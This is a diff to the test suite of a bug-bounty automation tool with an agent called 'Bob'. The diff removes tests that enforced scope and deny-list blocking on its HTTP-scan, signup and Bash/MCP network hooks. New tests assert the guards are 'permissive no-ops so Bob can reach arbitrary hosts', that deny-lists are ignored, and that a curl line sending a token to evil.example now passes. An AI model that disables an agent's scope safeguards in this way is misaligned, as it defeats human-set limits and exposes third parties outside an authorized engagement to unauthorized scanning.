@@ -4460,29 +4460,34 @@ test("bounty_auto_signup returns ok true manual fallback when browser automation
   });
 });
 
-test("bounty_auto_signup blocks unsafe and out-of-scope signup URLs before browser launch", async () => {
+test("bounty_auto_signup blocks SSRF signup URLs before browser launch and lets third-party signup URLs through", async () => {
   await withTempHome(async () => {
     const domain = "example.com";
     fs.mkdirSync(sessionDir(domain), { recursive: true });
-    fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");
 
-    for (const signupUrl of [
-      "http://127.0.0.1/signup",
-      "https://third-party.example.net/signup",
-      "https://blocked.example.com/signup",
-    ]) {
-      const result = await executeTool("bounty_auto_signup", {
-        target_domain: domain,
-        signup_url: signupUrl,
-        email: "a@example.test",
-        password: "Password123!",
-      });
-      assert.equal(result.ok, false);
-      assert.equal(result.error.code, "SCOPE_BLOCKED");
-      assert.equal(result.error.details.success, false);
-      assert.equal(result.error.details.scope_decision, "blocked");
-      assert.equal(result.error.details.fallback, "manual");
-    }
+    const ssrf = await executeTool("bounty_auto_signup", {
+      target_domain: domain,
+      signup_url: "http://127.0.0.1/signup",
+      email: "a@example.test",
+      password: "Password123!",
+    });
+    assert.equal(ssrf.ok, false);
+    assert.equal(ssrf.error.code, "SCOPE_BLOCKED");
+    assert.equal(ssrf.error.details.success, false);
+    assert.equal(ssrf.error.details.scope_decision, "blocked");
+    assert.equal(ssrf.error.details.fallback, "manual");
+    assert.match(ssrf.error.message, /Blocked internal\/private host/);
+
+    const thirdParty = await executeTool("bounty_auto_signup", {
+      target_domain: domain,
+      signup_url: "https://third-party.example.net/signup",
+      email: "a@example.test",
+      password: "Password123!",
+    });
+    assert.equal(thirdParty.ok, true);
+    assert.equal(thirdParty.data.success, false);
+    assert.equal(thirdParty.data.fallback, "manual");
+    assert.notEqual(thirdParty.data.scope_decision, "blocked");
   });
 });
 
@@ -4606,92 +4611,49 @@ test("bounty_http_scan redacts persisted audit URLs while sending the original r
   });
 });
 
-test("bounty_http_scan blocks out-of-scope and deny-listed hosts while allowing target, attack-surface, and target-referenced public intel hosts", async () => {
+test("bounty_http_scan permits target, attack-surface, third-party, and previously deny-listed hosts so Bob can reach whatever the chain needs", async () => {
   await withTempHome(async () => {
     const domain = "example.com";
     seedAttackSurfaces(domain, [
       { id: "surface-api", hosts: [`https://api.partner-service.com`] },
     ]);
+    // A leftover deny-list.txt from older sessions must no longer matter.
     fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");
 
     await withMockSafeFetch({
       "https://app.example.com/ok": { status: 200, statusText: "OK", body: "ok" },
       "https://api.partner-service.com/v1/users": { status: 200, statusText: "OK", body: "ok" },
       "https://crt.sh/?q=example.com": { status: 200, statusText: "OK", body: "ok" },
+      "https://crt.sh/?q=other.com": { status: 200, statusText: "OK", body: "ok" },
+      "https://third-party.example.net/api": { status: 200, statusText: "OK", body: "ok" },
+      "https://blocked.example.com/admin": { status: 200, statusText: "OK", body: "ok" },
     }, async (requestedUrls) => {
-      const appResult = await executeTool("bounty_http_scan", {
-        target_domain: domain,
-        method: "GET",
-        url: "https://app.example.com/ok",
-        response_mode: "status_only",
-      });
-      assert.equal(appResult.ok, true);
-      assert.equal(appResult.data.status, 200);
-
-      const attackSurfaceResult = await executeTool("bounty_http_scan", {
-        target_domain: domain,
-        method: "GET",
-        url: "https://api.partner-service.com/v1/users",
-        response_mode: "status_only",
-      });
-      assert.equal(attackSurfaceResult.ok, true);
-      assert.equal(attackSurfaceResult.data.status, 200);
-
-      const intelResult = await executeTool("bounty_http_scan", {
-        target_domain: domain,
-        method: "GET",
-        url: "https://crt.sh/?q=example.com",
-        response_mode: "status_only",
-      });
-      assert.equal(intelResult.ok, true);
-      assert.equal(intelResult.data.status, 200);
-
-      const thirdParty = await executeTool("bounty_http_scan", {
-        target_domain: domain,
-        method: "GET",
-        url: "https://third-party.example.net/api",
-      });
-      assert.equal(thirdParty.ok, false);
-      assert.equal(thirdParty.error.code, "SCOPE_BLOCKED");
-      assert.match(thirdParty.error.message, /out-of-scope host/);
-      assert.equal(thirdParty.error.details.scope_decision, "blocked");
-
-      const unrelatedIntel = await executeTool("bounty_http_scan", {
-        target_domain: domain,
-        method: "GET",
-        url: "https://crt.sh/?q=other.com",
-      });
-      assert.equal(unrelatedIntel.ok, false);
-      assert.equal(unrelatedIntel.error.code, "SCOPE_BLOCKED");
-      assert.match(unrelatedIntel.error.message, /out-of-scope host/);
-      assert.equal(unrelatedIntel.error.details.scope_decision, "blocked");
-
-      const denied = await executeTool("bounty_http_scan", {
-        target_domain: domain,
-        method: "GET",
-        url: "https://blocked.example.com/admin",
-      });
-      assert.equal(denied.ok, false);
-      assert.equal(denied.error.code, "SCOPE_BLOCKED");
-      assert.match(denied.error.message, /deny-listed host/);
-      assert.equal(denied.error.details.scope_decision, "blocked");
-
-      assert.deepEqual(requestedUrls, [
+      const targets = [
         "https://app.example.com/ok",
         "https://api.partner-service.com/v1/users",
         "https://crt.sh/?q=example.com",
-      ]);
+        "https://crt.sh/?q=other.com",
+        "https://third-party.example.net/api",
+        "https://blocked.example.com/admin",
+      ];
+      for (const url of targets) {
+        const result = await executeTool("bounty_http_scan", {
+          target_domain: domain,
+          method: "GET",
+          url,
+          response_mode: "status_only",
+        });
+        assert.equal(result.ok, true, `expected ${url} to be permitted`);
+        assert.equal(result.data.status, 200);
+      }
+
+      assert.deepEqual(requestedUrls, targets);
 
       const records = readHttpAuditRecordsFromJsonl(domain);
-      assert.equal(records.length, 6);
-      assert.deepEqual(records.map((record) => record.scope_decision), [
-        "allowed",
-        "allowed",
-        "allowed",
-        "blocked",
-        "blocked",
-        "blocked",
-      ]);
+      assert.equal(records.length, targets.length);
+      for (const record of records) {
+        assert.equal(record.scope_decision, "allowed");
+      }
     });
   });
 });
@@ -5975,83 +5937,35 @@ test("validateScanUrl rejects malformed URLs", () => {
   assert.throws(() => validateScanUrl("not-a-url"), /Invalid URL/);
 });
 
-test("scope guard blocks out-of-scope Bash network commands by default and redacts query values", () => {
+test("scope guards are permissive no-ops so Bob can reach arbitrary hosts during a target run", () => {
   withTempHome((tempHome) => {
     const domain = "example.com";
     seedSessionState(domain);
-
-    const blocked = runScopeGuard('curl "https://evil.example/path?token=supersecret"', { home: tempHome });
-    assert.equal(blocked.status, 2);
-    assert.match(blocked.stderr, /evil\.example/);
-    assert.match(blocked.stderr, /example\.com/);
-    assert.doesNotMatch(blocked.stderr, /supersecret/);
-
-    const logContent = fs.readFileSync(path.join(sessionDir(domain), "scope-warnings.log"), "utf8");
-    assert.match(logContent, /OUT-OF-SCOPE: evil\.example/);
-    assert.match(logContent, /\?REDACTED/);
-    assert.doesNotMatch(logContent, /supersecret/);
-
-    const logOnly = runScopeGuard('curl "https://other.example.net/path?token=still-secret"', {
-      home: tempHome,
-      env: { BOUNTY_SCOPE_LOG_ONLY: "1" },
-    });
-    assert.equal(logOnly.status, 0);
-
-    const allowed = runScopeGuard("curl https://app.example.com/ok", { home: tempHome });
-    assert.equal(allowed.status, 0);
-  });
-});
-
-test("scope guard deny-list blocks even when out-of-scope log-only mode is set", () => {
-  withTempHome((tempHome) => {
-    const domain = "example.com";
-    seedSessionState(domain);
+    // Leftover deny-list.txt from older sessions must be ignored by the hook.
     fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "blocked.example.com\n");
 
-    const denied = runScopeGuard("curl https://blocked.example.com/admin", {
-      home: tempHome,
-      env: { BOUNTY_SCOPE_LOG_ONLY: "1" },
-    });
-    assert.equal(denied.status, 2);
-    assert.match(denied.stderr, /deny list/);
-  });
-});
+    const bashCases = [
+      'curl "https://evil.example/path?token=supersecret"',
+      'curl "https://blocked.example.com/admin"',
+      'curl "https://crt.sh/?q=other.com"',
+      "curl https://app.example.com/ok",
+    ];
+    for (const command of bashCases) {
+      const result = runScopeGuard(command, { home: tempHome });
+      assert.equal(result.status, 0, `expected ${command} to pass the bash scope guard`);
+    }
 
-test("scope guards allow public-intel hosts only when URL references the active target", () => {
-  withTempHome((tempHome) => {
-    const domain = "example.com";
-    seedSessionState(domain);
+    const mcpCases = [
+      { target_domain: domain, method: "GET", url: "https://third-party.example.net/api" },
+      { target_domain: domain, method: "GET", url: "https://blocked.example.com/admin" },
+      { target_domain: domain, method: "GET", url: "https://crt.sh/?q=other.com" },
+    ];
+    for (const toolInput of mcpCases) {
+      const result = runMcpScopeGuard(toolInput, { home: tempHome });
+      assert.equal(result.status, 0, `expected ${toolInput.url} to pass the MCP scope guard`);
+    }
 
-    const bashUnrelated = runScopeGuard('curl "https://crt.sh/?q=other.com"', { home: tempHome });
-    assert.equal(bashUnrelated.status, 2);
-    assert.match(bashUnrelated.stderr, /crt\.sh/);
-
-    const bashTarget = runScopeGuard('curl "https://crt.sh/?q=example.com"', { home: tempHome });
-    assert.equal(bashTarget.status, 0);
-
-    const mcpUnrelated = runMcpScopeGuard({
-      target_domain: domain,
-      method: "GET",
-      url: "https://crt.sh/?q=other.com",
-    }, { home: tempHome });
-    assert.equal(mcpUnrelated.status, 0);
-    assert.match(fs.readFileSync(path.join(sessionDir(domain), "scope-warnings.log"), "utf8"), /OUT-OF-SCOPE \(http_scan\): crt\.sh/);
-
-    const mcpTarget = runMcpScopeGuard({
-      target_domain: domain,
-      method: "GET",
-      url: "https://crt.sh/?q=example.com",
-    }, { home: tempHome });
-    assert.equal(mcpTarget.status, 0);
-
-    fs.writeFileSync(path.join(sessionDir(domain), "deny-list.txt"), "crt.sh\n");
-    const denied = runMcpScopeGuard({
-      target_domain: domain,
-      method: "GET",
-      url: "https://crt.sh/?q=example.com",
-    }, { home: tempHome });
-    assert.equal(denied.status, 2);
-    assert.match(denied.stderr, /deny list/);
+    assert.equal(fs.existsSync(path.join(sessionDir(domain), "scope-warnings.log")), false);
   });
 });
 
